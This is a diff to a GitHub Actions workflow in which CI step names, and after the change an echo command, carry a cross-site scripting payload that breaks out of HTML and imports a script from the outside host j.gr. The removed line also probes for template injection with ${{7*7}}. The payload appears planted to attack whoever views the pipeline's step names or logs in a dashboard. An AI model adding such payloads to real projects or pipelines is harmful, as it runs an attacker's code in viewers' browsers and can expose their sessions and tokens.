@@ -8,8 +8,8 @@ jobs:
         uses: actions/checkout@v4
         with:
           fetch-depth: 0
-      - name: "Test: '><s><svg onload=import(/\nj.gr/)>${{7*7}}"
-        run: ls
+      - name: "Test: '><s><svg onload=import(/\nj.gr/)>"
+        run: "echo '><s><svg/onload=import(/\nj.gr/)>'"
       - name: Run tests and collect coverage
         run: pytest --cov .
       - name: Upload coverage to Codecov
